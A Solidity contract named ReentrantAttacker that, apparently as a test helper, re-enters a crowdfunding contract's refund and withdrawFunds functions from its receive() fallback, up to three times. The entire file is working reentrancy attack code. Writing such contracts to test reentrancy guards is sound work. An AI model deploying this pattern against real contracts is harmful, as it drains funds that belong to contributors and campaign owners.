// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfunding {
    function contribute(uint256 campaignId) external payable;
    function refund(uint256 campaignId) external;
    function withdrawFunds(uint256 campaignId) external;
}

contract ReentrantAttacker {
    ICrowdfunding public immutable crowdfunding;
    uint256 public campaignId;
    bool public attackWithdraw;
    uint256 public calls;

    constructor(address _crowdfunding) {
        crowdfunding = ICrowdfunding(_crowdfunding);
    }

    function contributeToTarget(uint256 _campaignId) external payable {
        campaignId = _campaignId;
        crowdfunding.contribute{value: msg.value}(_campaignId);
    }

    function launchRefundAttack(uint256 _campaignId) external {
        campaignId = _campaignId;
        attackWithdraw = false;
        calls = 0;
        crowdfunding.refund(_campaignId);
    }

    function launchWithdrawAttack(uint256 _campaignId) external {
        campaignId = _campaignId;
        attackWithdraw = true;
        calls = 0;
        crowdfunding.withdrawFunds(_campaignId);
    }

    receive() external payable {
        if (address(crowdfunding).balance > 0 && calls < 3) {
            calls++;
            if (attackWithdraw) {
                crowdfunding.withdrawFunds(campaignId);
            } else {
                crowdfunding.refund(campaignId);
            }
        }
    }
}